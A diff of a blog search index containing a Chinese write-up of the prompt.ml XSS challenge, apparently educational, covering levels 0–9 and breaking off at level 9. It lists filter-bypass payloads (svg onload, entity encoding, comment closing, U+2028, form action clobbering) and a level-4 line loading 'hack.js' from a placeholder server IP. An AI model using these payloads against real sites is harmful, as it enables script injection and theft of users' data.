@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[prompt to win(1) writeup]]></title>
+    <title><![CDATA[prompt(1) to win writeup]]></title>
     <url>%2F2018%2F12%2F23%2Fprompt%2F</url>
     <content type="text"><![CDATA[prompt.ml xss挑战平台规则是成功执行prompt(1)即可成功 0代码：12345function escape(input) &#123; // warm up // script should be executed without user interaction return &apos;&lt;input type=&quot;text&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;;&#125; 没有任何过滤，闭合括号就行payload1:11&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt; payload2:1&quot;&gt;&lt;svg/onload=prompt(1)&gt; 关于svg标签的问题，参考文章,学习了新姿势 1代码：12345678function escape(input) &#123; // tags stripping mechanism from ExtJS library // Ext.util.Format.stripTags var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi; input = input.replace(stripTagsRE, &apos;&apos;); return &apos;&lt;article&gt;&apos; + input + &apos;&lt;/article&gt;&apos;;&#125; 这里过滤了 &lt;&gt;号里的内容过滤方法就是用//注释，这样的话也是可以成功的payload:1&lt;svg/onload=prompt(1)// 2代码：1234567function escape(input) &#123; // v-- frowny face input = input.replace(/[=(]/g, &apos;&apos;); // ok seriously, disallows equal signs and open parenthesis return input;&#125; 可以看出来这里是过滤了(,同样的，在svg标签里的script，&amp;#40;会被解析成(,相同的道理还有:1&amp;#x28;、&amp;lpar payload:1&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;&lt;/svg&gt; 网上还有一种payload,调用的eval:1&lt;script&gt;eval.call`$&#123;&apos;prompt\x281)&apos;&#125;`&lt;/script&gt; 3代码：1234567function escape(input) &#123; // filter potential comment end delimiters input = input.replace(/-&gt;/g, &apos;_&apos;); // comment the input to avoid script execution return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;;&#125; 当-&gt;连在一起的时候会被替换成_，需要做的是将前面的&lt;!--闭合，绕过的方法很简单--!&gt;，这样也是可以闭合的payload:1--!&gt;&lt;script&gt;prompt(1)&lt;/script&gt; 网上的另一种payload:1--!&gt;&lt;svg/onload=prompt(1) 4代码1234567891011function escape(input) &#123; // make sure the script belongs to own site // sample script: http://prompt.ml/js/test.js if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) &#123; var script = document.createElement(&apos;script&apos;); script.src = input; return script.outerHTML; &#125; else &#123; return &apos;Invalid resource.&apos;; &#125;&#125; 这里好像是涉及到了同源策略，prompt.ml才能访问，这里绕过的是URL黑魔法，举个例子: http://cherry@qq.com这句话的意思是用cherry这个用户名去登录qq.com，所以代码里的if就能绕过了payload:1&lt;script src=&quot;http://prompt.ml%2f服务器IP/hack.js&quot;&gt;&lt;/script&gt; 5代码1234567function escape(input) &#123; // apply strict filter rules of level 0 // filter &quot;&gt;&quot; and event handlers input = input.replace(/&gt;|on.+?=|focus/gi, &apos;_&apos;); return &apos;&lt;input value=&quot;&apos; + input + &apos;&quot; type=&quot;text&quot;&gt;&apos;;&#125; 这里是过滤了&gt;，然后on和=之间有字符的，focus替换成了_，这里绕过的方式就是回车，比如:12alert(&apos;cherry&apos;); 这样也是可以执行的，并且这样可以绕过正则表达式；payload：12 &quot; src=1 type=image onerror=prompt(1) &quot; 6代码1234567891011121314151617181920212223242526272829303132function escape(input) &#123; // let&apos;s do a post redirection try &#123; // pass in formURL#formDataJSON // e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125; var segments = input.split(&apos;#&apos;); var formURL = segments[0]; var formData = JSON.parse(segments[1]); var form = document.createElement(&apos;form&apos;); form.action = formURL; form.method = &apos;post&apos;; for (var i in formData) &#123; var input = form.appendChild(document.createElement(&apos;input&apos;)); input.name = i; input.setAttribute(&apos;value&apos;, formData[i]); &#125; return form.outerHTML + &apos; \n\&lt;script&gt; \n\ // forbid javascript: or vbscript: and data: stuff \n\ if (!/script:|data:/i.test(document.forms[0].action)) \n\ document.forms[0].submit(); \n\ else \n\ document.write(&quot;Action forbidden.&quot;) \n\&lt;/script&gt; \n\ &apos;; &#125; catch (e) &#123; return &apos;Invalid form data.&apos;; &#125;&#125; 这里代码较长，经过分析和测试，知道了是 http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}这样的形式，http://httpbin.org/post是表单中的action,name和Matt分别是表单的name、value这里经常用的方法是直接用JavaScript的伪协议: javascript:prompt(1)但是题目也做了防护，1234if (!/script:|data:/i.test(document.forms[0].action)) \n\ document.forms[0].submit(); \n\ else \n\ document.write(&quot;Action forbidden.&quot;) 如果直接用的话会出forbidden，这里绕过的方法利用了Javascirpt中表单DOM操作时，会先将form中的name属性作为action的输入框，如果没有的话，再选择action属性进行输入。可以用下列代码实例，如：123456&lt;body&gt;&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=1&gt;&lt;/input&gt;&lt;/form&gt;&lt;script&gt; alert(document.forms[0].action); &lt;/script&gt; &lt;/body&gt; 这样的效果是: 再将代码换成123456&lt;body&gt;&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;1&quot; value=1&gt;&lt;/input&gt;&lt;/form&gt;&lt;script&gt; alert(document.forms[0].action); &lt;/script&gt; &lt;/body&gt; 这样的效果是: payload:1javascript:prompt(1)#&#123;&quot;action&quot;:&quot;1&quot;&#125; 7代码12345678function escape(input) &#123; // pass in something like dog#cat#bird#mouse... var segments = input.split(&apos;#&apos;); return segments.map(function(title) &#123; // title can only contain 12 characters return &apos;&lt;p class=&quot;comment&quot; title=&quot;&apos; + title.slice(0, 12) + &apos;&quot;&gt;&lt;/p&gt;&apos;; &#125;).join(&apos;\n&apos;);&#125; 这关限制是做的长度限制，并且用#分隔后，可以输入很多行，每行限制12个字符绕过的方法就是用JavaScript的注释符，/**/,payload:1&quot;&gt;&lt;script&gt;/*#*/prompt/*#*/(1)/*#*/&lt;/script&gt; 网上的第二种用&lt;svg&gt;绕过的方法，原理类似payload:1&quot;&gt;&lt;svg/a=#&quot;onload=&apos;/*#*/prompt(1)&apos; 8代码12345678910function escape(input) &#123; // prevent input from getting out of comment // strip off line-breaks and stuff input = input.replace(/[\r\n&lt;/&quot;]/g, &apos;&apos;); return &apos; \n\&lt;script&gt; \n\ // console.log(&quot;&apos; + input + &apos;&quot;); \n\&lt;/script&gt; &apos;;&#125; 先看过滤，换行干掉了，&lt; &quot;也干掉了,没啥思路，找了网上的wp后知道了用unicode绕过 U+2028是行分隔符 U+2029是段落分隔符payload:12&apos;\u2028prompt(1)\u2028--&gt;&apos; (放入控制台执行之后将得到的输入) 9代码123456789function escape(input) &#123; // filter potential start-tags input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;); // use all-caps for heading input = input.toUpperCase(); // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS! return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;;&#125; 函数先将&lt;*格式的全都变成了&lt;_*，然后还将字母全部转为大写形式]]></content>
       <categories>
@@ -30,8 +30,8 @@
         <category>WooYun</category>
       </categories>
       <tags>
-        <tag>漏洞利用</tag>
         <tag>命令执行</tag>
+        <tag>漏洞利用</tag>
       </tags>
   </entry>
   <entry>
@@ -72,8 +72,8 @@
         <category>CVE</category>
       </categories>
       <tags>
-        <tag>漏洞利用</tag>
         <tag>命令执行</tag>
+        <tag>漏洞利用</tag>
       </tags>
   </entry>
   <entry>
@@ -84,9 +84,9 @@
         <category>CVE</category>
       </categories>
       <tags>
+        <tag>漏洞利用</tag>
         <tag>任意文件写入</tag>
         <tag>反弹shell</tag>
-        <tag>漏洞利用</tag>
       </tags>
   </entry>
   <entry>
@@ -251,8 +251,8 @@
         <category>writeup</category>
       </categories>
       <tags>
-        <tag>sql注入</tag>
         <tag>反序列化</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
